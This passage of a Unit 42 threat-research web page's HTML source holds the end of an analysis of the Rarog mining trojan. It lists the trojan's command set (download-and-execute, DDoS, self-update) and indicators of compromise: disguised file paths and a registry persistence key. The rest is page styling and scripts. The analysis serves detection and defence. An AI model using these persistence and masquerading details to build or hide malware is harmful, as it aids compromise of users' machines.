Rarog to perform. The following list of supported commands are included:\r\n\r\n\r\n\r\nCommand\r\nDescription\r\n\r\n\r\ninstall\r\nDownload and execute specified file\r\n\r\n\r\nopen_url\r\nOpen the specified URL in browser\r\n\r\n\r\nddos\r\nPerform DDoS operations against specified target\r\n\r\n\r\nupdate\r\nUpdate Rarog Trojan from specified URL\r\n\r\n\r\nrestart_bot\r\nRestart Rarog Trojan\r\n\r\n\r\ndelete_bot\r\nDelete Rarog Trojan\r\n\r\n\r\n\r\n&nbsp;\r\nSHA256 Hashes\r\nFor a full list of SHA256 hashes and their first encountered timestamp, please refer to the following file.\r\n&nbsp;\r\nC2 Servers\r\nFor a full list of C2 servers and their first encountered timestamp, please refer to the following file.\r\n&nbsp;\r\nFile and Folder Artifacts\r\nC:\\ProgramData\\MicrosoftCorporation\\Windows\\System32\\\r\nC:\\ProgramData\\MicrosoftCorporation\\Windows\\System32\\Isass.exe\r\nC:\\ProgramData\\MicrosoftCorporation\\Windows\\System32\\_Isass.exe\r\nC:\\ProgramData\\{4FCEED6C-B7D9-405B-A844-C3DBF418BF87}\\\r\nC:\\ProgramData\\{4FCEED6C-B7D9-405B-A844-C3DBF418BF87}\\driver.dat\r\nC:\\ProgramData\\WindowsAppCertification\\\r\nC:\\ProgramData\\WindowsAppCertification\\WindowHelperStorageHostSystemThread.ps1\r\nC:\\ProgramData\\WindowsAppCertification\\cert.cmd\r\nC:\\ProgramData\\WindowsAppCertification\\checker.vbs\r\nC:\\ProgramData\\MicrosoftCorporation\\Windows\\Helpers\\\r\nC:\\ProgramData\\MicrosoftCorporation\\Windows\\Helpers\\SecurityHeaIthService.exe\r\nC:\\ProgramData\\MicrosoftCorporation\\Windows\\Helpers\\SystemldleProcess.exe\r\nC:\\ProgramData\\MicrosoftCorporation\\Windows\\Helpers\\winIogon.exe\r\nC:\\ProgramData\\{CB28D9D3-6B5D-4AFA-BA37-B4AFAABF70B8}\\\r\nC:\\ProgramData\\MicrosoftCorporation\\Windows\\Modules\r\n&nbsp;\r\nRegistry Artifacts\r\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Windows_Antimalware_Host_Syst\r\n&nbsp;","publisher":{"@type":"Organization","@id":"#panworg"},"image":{"@type":"ImageObject","url":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/uploads\/2016\/09\/unit42-web-banner-650x300-300x300.jpg","width":300,"height":300},"speakable":{"@type":"SpeakableSpecification","xPath":["\/html\/head\/title","\/html\/head\/meta[@name='description']\/@content"]},"author":[{"@type":"Person","name":"Unit 42"}]}</script><link rel='stylesheet' id='crayon-css' href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=_2.7.2_beta' media='all' />
<link rel='stylesheet' id='crayon-theme-classic-css' href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css' href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' media='all' />
<style id='co-authors-plus-coauthors-style-inline-css'>
.wp-block-co-authors-plus-coauthors.is-layout-flow [class*=wp-block-co-authors-plus]{display:inline}

</style>
<style id='co-authors-plus-avatar-style-inline-css'>
.wp-block-co-authors-plus-avatar :where(img){height:auto;max-width:100%;vertical-align:bottom}.wp-block-co-authors-plus-coauthors.is-layout-flow .wp-block-co-authors-plus-avatar :where(img){vertical-align:middle}.wp-block-co-authors-plus-avatar:is(.alignleft,.alignright){display:table}.wp-block-co-authors-plus-avatar.aligncenter{display:table;margin-inline:auto}

</style>
<style id='co-authors-plus-image-style-inline-css'>
.wp-block-co-authors-plus-image{margin-bottom:0}.wp-block-co-authors-plus-image :where(img){height:auto;max-width:100%;vertical-align:bottom}.wp-block-co-authors-plus-coauthors.is-layout-flow .wp-block-co-authors-plus-image :where(img){vertical-align:middle}.wp-block-co-authors-plus-image:is(.alignfull,.alignwide) :where(img){width:100%}.wp-block-co-authors-plus-image:is(.alignleft,.alignright){display:table}.wp-block-co-authors-plus-image.aligncenter{display:table;margin-inline:auto}

</style>
<style id='safe-svg-svg-icon-style-inline-css'>
.safe-svg-cover{text-align:center}.safe-svg-cover .safe-svg-inside{display:inline-block;max-width:100%}.safe-svg-cover svg{height:100%;max-height:100%;max-width:100%;width:100%}

</style>
<style id='classic-theme-styles-inline-css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='post-views-counter-frontend-css' href='https://unit42.paloaltonetworks.com/wp-content/plugins/post-views-counter/css/frontend.min.css?ver=1.4.7' media='all' />
<link rel='stylesheet' id='wpml-legacy-post-translations-0-css' href='https://unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-post-translations/style.min.css?ver=1' media='all' />
<link rel='stylesheet' id='unit42-v6-style-css' href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/style.css?ver=1.0.0' media='all' />
<link rel='stylesheet' id='unit42-v6-head-styles-css' href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/css/head-styles.css?ver=1.0.0' media='all' />
<link rel='stylesheet' id='unit42-v5-custom-styles-css' href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/css/main.css?ver=1.0.0' media='all' />
<link rel='stylesheet' id='unit42-v6-plugin-styles-css' href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/css/plugin.css?ver=1.0.0' media='all' />
<link rel='stylesheet' id='unit42-v6-custom-styles-css' href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/css/main-redesign.css?ver=1.0.0' media='all' />
<link rel='stylesheet' id='like-dislike-css' href='https://unit42.paloaltonetworks.com/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/css/ldc-lite.css?ver=1.0.0' media='all' />
<script src="https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
<script src="https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
<script id="crayon_js-js-extra">
var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
</script>
<script src="https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.min.js?ver=_2.7.2_beta" id="crayon_js-js"></script>
<script id="post-views-counter-frontend-js-before">
var pvcArgsFrontend = {"mode":"js","postID":70385,"requestURL":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","nonce":"7165accd8e","dataStorage":"cookies","multisite":false,"path":"\/","domain":""};
</script>
<script src="https://unit42.paloaltonetworks.com/wp-content/plugins/post-views-counter/js/frontend.min.js?ver=1.4.7" id="post-views-counter-frontend-js"></script>
<script id="wpml-xdomain-data-js-extra">
var wpml_xdomain_data = {"css_selector":"wpml-ls-item","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","current_lang":"en","_nonce":"239a698056"};
</script>
<script src="https://unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/res/js/xdomain-data.js?ver=4.6.13" id="wpml-xdomain-data-js" defer data-wp-strategy="defer"></script>
<link rel="https://api.w.org/" href="https://unit42.paloaltonetworks.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://unit42.paloaltonetworks.com/wp-json/wp/v2/posts/70385" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://unit42.paloaltonetworks.com/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.6.2" />
<link rel='shortlink' href='https://unit42.paloaltonetworks.com/?p=70385' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-smoking-rarog-mining-trojan%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-smoking-rarog-mining-trojan%2F&#038;format=xml" />
<meta name="generator" content="WPML ver:4.6.13 stt:1,28;" />
<meta name="google-site-verification" content="zHZtYOWm9hm4SZgsH7wqiYcOwmsAsxDUDU4UD1QxB40" /><style>#wpdevart_lb_overlay{background-color:#000000;} #wpdevart_lb_overlay.wpdevart_opacity{opacity:0.8 !important;} #wpdevart_lb_main_desc{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;} #wpdevart_lb_information_content{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;}
		#wpdevart_lb_information_content{
			width:100%;	
			padding-top:0px;
			padding-bottom:0px;
		}
		#wpdevart_info_counter_of_imgs{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_caption{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_title{
			    display: inline-block;
				padding-left:5px;
				padding-right:5px;
				font-size:15px;
				color:#000000;
		}
		@-webkit-keyframes rotate {
			to   {-webkit-transform: rotate(360deg);}
			from  {-webkit-transform: rotate(0deg);}
		}
		@keyframes rotate {
			to   {transform: rotate(360deg);}
			from  {transform: rotate(0deg);}
		}
		#wpdevart_lb_loading_img,#wpdevart_lb_loading_img_first{
			-webkit-animation: rotate 2s linear  infinite;
    		animation: rotate 2s linear infinite;
		}
	  </style>      <link rel="pingback" href="https://unit42.paloaltonetworks.com/xmlrpc.php"><link rel="icon" href="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-Unit42-180x180-1.png" sizes="32x32" />
<link rel="icon" href="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-Unit42-180x180-1.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-Unit42-180x180-1.png" />
<meta name="msapplication-TileImage" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-Unit42-180x180-1.png" />
<script>var $ = jQuery;</script>

    <script type="text/javascript">
    ;(function(win, doc, style, timeout) {
    var STYLE_ID = 'at-body-style';
    function getParent() {
    return doc.getElementsByTagName('head')[0];
    }
    function addStyle(parent, id, def) {
        if (!parent) {
        return;
        }
        var style = doc.createElement('style');
        style.id = id;
        style.innerHTML = def;
        parent.appendChild(style);
    }
    function removeStyle(parent, id) {
        if (!parent) {
            return;
        }
        var style = doc.getElementById(id);
        if (!style) {
            return;
        }
        parent.removeChild(style);
    }
    addStyle(getParent(), STYLE_ID, style);
    setTimeout(function() {
    removeStyle(getParent(), STYLE_ID);
    }, timeout);
    }(window, document, "body {visibility:hidden !important}", 3000));
    </script>

            <script src="https://assets.adobedtm.com/9273d4aedcd2/0d76ae0322d7/launch-425c423d843b.min.js" async></script>
            <script type="text/javascript" src="https://www.paloaltonetworks.com/content/dam/pan/en_US/includes/attribution.js"></script>


<script type="text/javascript">
var isIE11 = !!navigator.userAgent.match(/Trident.*rv\:11\./);
if(isIE11){
    var polyfill = 'https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/scripts/polyfill.min.js';
    document.write('<script type="text/javascript" src="'+polyfill+'">\x3C/script>');
}
    /**
 * String.prototype.replaceAll() polyfill
 * https://gomakethings.com/how-to-replace-a-section-of-a-string-with-another-one-with-vanilla-js/
 * @author Chris Ferdinandi
 * @license MIT
 */
if (!String.prototype.replaceAll) {
	String.prototype.replaceAll = function(str, newStr){
		// If a regex pattern
		if (Object.prototype.toString.call(str).toLowerCase() === '[object regexp]') {
			return this.replace(str, newStr);
		}
		// If a string
		return this.replace(new RegExp(str, 'g'), newStr);
	};
}

    /*! lozad.js - v1.16.0 - 2020-09-06 */
!function(t,e){"object"==typeof exports&&"undefined"!=typeof module?module.exports=e():"function"==typeof define&&define.amd?define(e):t.lozad=e()}(this,function(){"use strict";
/**
   * Detect IE browser
   * @const {boolean}
   * @private
   */var g="undefined"!=typeof document&&document.documentMode,f={rootMargin:"0px",threshold:0,load:function(t){if("picture"===t.nodeName.toLowerCase()){var e=t.querySelector("img"),r=!1;null===e&&(e=document.createElement("img"),r=!0),g&&t.getAttribute("data-iesrc")&&(e.src=t.getAttribute("data-iesrc")),t.getAttribute("data-alt")&&(e.alt=t.getAttribute("data-alt")),r&&t.append(e)}if("video"===t.nodeName.toLowerCase()&&!t.getAttribute("data-src")&&t.children){for(var a=t.children,o=void 0,i=0;i<=a.length-1;i++)(o=a[i].getAttribute("data-src"))&&(a[i].src=o);t.load()}t.getAttribute("data-poster")&&(t.poster=t.getAttribute("data-poster")),t.getAttribute("data-src")&&(t.src=t.getAttribute("data-src")),t.getAttribute("data-srcset")&&t.setAttribute("srcset",t.getAttribute("data-srcset"));var n=",";if(t.getAttribute("data-background-delimiter")&&(n=t.getAttribute("data-background-delimiter")),t.getAttribute("data-background-image"))t.style.backgroundImage="url('"+t.getAttribute("data-background-image").split(n).join("'),url('")+"')";else if(t.getAttribute("data-background-image-set")){var d=t.getAttribute("data-background-image-set").split(n),u=d[0].substr(0,d[0].indexOf(" "))||d[0];// Substring before ... 1x
u=-1===u.indexOf("url(")?"url("+u+")":u,1===d.length?t.style.backgroundImage=u:t.setAttribute("style",(t.getAttribute("style")||"")+"background-image: "+u+"; background-image: -webkit-image-set("+d+"); background-image: image-set("+d+")")}t.getAttribute("data-toggle-class")&&t.classList.toggle(t.getAttribute("data-toggle-class"))},loaded:function(){}};function A(t){t.setAttribute("data-loaded",!0)}var m=function(t){return"true"===t.getAttribute("data-loaded")},v=function(t){var e=1<arguments.length&&void 0!==arguments[1]?arguments[1]:document;return t instanceof Element?[t]:t instanceof NodeList?t:e.querySelectorAll(t)};return function(){var r,a,o=0<arguments.length&&void 0!==arguments[0]?arguments[0]:".lozad",t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:{},e=Object.assign({},f,t),i=e.root,n=e.rootMargin,d=e.threshold,u=e.load,g=e.loaded,s=void 0;"undefined"!=typeof window&&window.IntersectionObserver&&(s=new IntersectionObserver((r=u,a=g,function(t,e){t.forEach(function(t){(0<t.intersectionRatio||t.isIntersecting)&&(e.unobserve(t.target),m(t.target)||(r(t.target),A(t.target),a(t.target)))})}),{root:i,rootMargin:n,threshold:d}));for(var c,l=v(o,i),b=0;b<l.length;b++)(c=l[b]).getAttribute("data-placeholder-background")&&(c.style.background=c.getAttribute("data-placeholder-background"));return{observe:function(){for(var t=v(o,i),e=0;e<t.length;e++)m(t[e])||(s?s.observe(t[e]):(u(t[e]),A(t[e]),g(t[e])))},triggerLoad:function(t){m(t)||(u(t),A(t),g(t))},observer:s}}});

</script>

<!-- <script src="https://www.google.com/recaptcha/api.js"></script>  -->

<!--  End: Scripts Migrated From Unit42-v5 -->

</head>
<body class="post-template-default single single-post postid-70385 single-format-standard no-sidebar">
<header class="haeder py-15 position-relative z-index-2" style="display: none;">
  <div class="container px-sm-30 px-35">
    <div class="row">
        <div class="first-logo col-sm-auto col-6 mb-sm-0 mb-40 text-sm-center order-1">
                        <a href="https://www.paloaltonetworks.com/">
                <img src="/wp-content/uploads/2021/07/PANW_Parent.png" width="140px" alt="Logo" />
            </a>
        </div>
      <div class="col-sm-auto col-6 text-sm-center order-sm-2 order-4 second-logo-unit">
        <a href="https://unit42.paloaltonetworks.com/">
            <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/unit42-logo-white.svg" class="attachment-full size-full" alt="Unit42 Logo"  width="150" height="35"/>
        </a>
      </div>

      <div class="col-auto d-sm-none ml-auto mb-40 order-2">
        <button class="btn__search" data-toggle="collapse" data-target="#search" aria-label="search"><i class="ui ui-1"></i></button>
      </div>

      <div id="search" class="collapse d-sm-block col-sm-auto col-12 ml-auto order-3">
        <div class="pt-sm-0 pt-20 pb-sm-0 pb-40 mt-sm-0 mt-n30">
                      <input type="search" placeholder="Search Unit 42" id="innerSearch" class="header__search" value="" required aria-label="Inner Search">
                  </div>
      </div>

      <div class="col-auto d-sm-none d-flex ml-auto align-items-center order-5">
        <button class="btn__menu rounded" data-toggle="collapse" data-target="#navigation">Menu</button>
      </div>
    </div>
  </div>
</header>

<nav id="navigation" class="site-nav collapse d-sm-block pb-20 mt-sm-10"  style="display: none!important;">
  <div class="container px-sm-30">
    <ul id="menu-primary-navigation" class="main-menu d-sm-flex font-weight-medium"><li id="menu-item-97290" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-97290"><a href="https://unit42.paloaltonetworks.com/tools/">Tools</a></li>
<li id="menu-item-41" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-41"><a href="https://unit42.paloaltonetworks.com/atoms/">ATOMs</a></li>
<li id="menu-item-119884" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-119884"><a target="_blank" rel="noopener" href="https://www.paloaltonetworks.com/unit42">Security Consulting</a></li>
<li id="menu-item-81229" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-81229"><a href="https://unit42.paloaltonetworks.com/about-unit-42/">About Us</a></li>
<li id="menu-item-121229" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-121229"><a href="https://start.paloaltonetworks.com/contact-unit42.html"><b style="color:#C84727">Under Attack?</b></a></li>
</ul>  </div>
</nav>
<div class="panClean pan-template-home" id="main-nav-menu-cont" style="display:none;">
    <div class="cleanHeader mainNavigationComp baseComponent parbase">
        <div class="productNav2021Component dark default" id="PAN_2021_NAV_ASYNC">
        </div>
  </div>
<div class="cleanTopHtml htmlComp baseComponent parbase"><div class="base-component-spacer spacer-none  "></div>
</div>
</div>
<!--  Start: Scripts Migrated From Unit42-v5 -->
<script type="text/javascript">
	function getCookie(cname) {
	 	var name = cname + "=";
  		var decodedCookie = decodeURIComponent(document.cookie);
		var ca = decodedCookie.split(';');
  		for(var i = 0; i <ca.length; i++) {
    			var c = ca[i];
    			while (c.charAt(0) == ' ') {
     				 c = c.substring(1);
    			}
    			if (c.indexOf(name) == 0) {
    				 return c.substring(name.length, c.length);
    			}
  		}
  		return "";
	}

	var referer = "";//sessionStorage.container;
	var pcontainer = sessionStorage.getItem("container");
	var searchResultsPagePath = "";
	if(((pcontainer) && pcontainer.indexOf('Prisma')!=-1)){
	    referer = 'Prisma' ;
	}
        else if(((pcontainer) && pcontainer.indexOf('Cortex')!=-1)){
	    referer = 'Cortex' ;
	}
        else if(((pcontainer) && pcontainer.indexOf('Sase')!=-1)){
	    referer = 'Sase' ;
	}
	else if(((pcontainer) && pcontainer.indexOf('Unit')!=-1)){
	    referer = 'Unit' ;
	}
	else if(((pcontainer) && pcontainer.indexOf('Ngfw')!=-1)){
	    referer = 'Ngfw' ;
	}
        var fromRef = document.referrer;
        var nContainer = getCookie("navContainer");
        if(nContainer){//If user is coming from main site, we need to reset the container		
		if(fromRef  && fromRef.indexOf("prismacloud.io")!=-1){
                        referer = 'Prisma' ;
                        sessionStorage.setItem("container","Prisma");
                } else if(fromRef.indexOf("paloaltonetworks.com")!=-1 || fromRef.indexOf("paloaltonetworks.jp")!=-1 ){
                        if(nContainer.indexOf('Prisma') != -1){
                            referer = 'Prisma' ;
                            sessionStorage.setItem("container","Prisma");
                        }
                        if(nContainer.indexOf('Cortex') != -1){
                            referer = 'Cortex' ;
                            sessionStorage.setItem("container","Cortex");
                        }
			if(nContainer.indexOf('Sase') != -1){
                            referer = 'Sase' ;
                            sessionStorage.setItem("container","Sase");
                        }
			if(nContainer.indexOf('Unit') != -1){
                            referer = 'Unit' ;
                            sessionStorage.setItem("container","Unit");
                        }
			if(nContainer.indexOf('Ngfw') != -1){
                            referer = 'Ngfw' ;
                            sessionStorage.setItem("container","Ngfw");
                        }
			document.cookie = 'navContainer=; path=/; domain=.paloaltonetworks.com; expires=' + new Date(0).toUTCString();
		}
	}
if(referer != "Prisma" && referer != "Cortex" && referer != "Sase" && referer != "Unit" && referer != "Ngfw") {
    referer = 'Unit' ;
    sessionStorage.setItem("container","Unit");
}
function callMainSitePrismaNavHTML(){
    
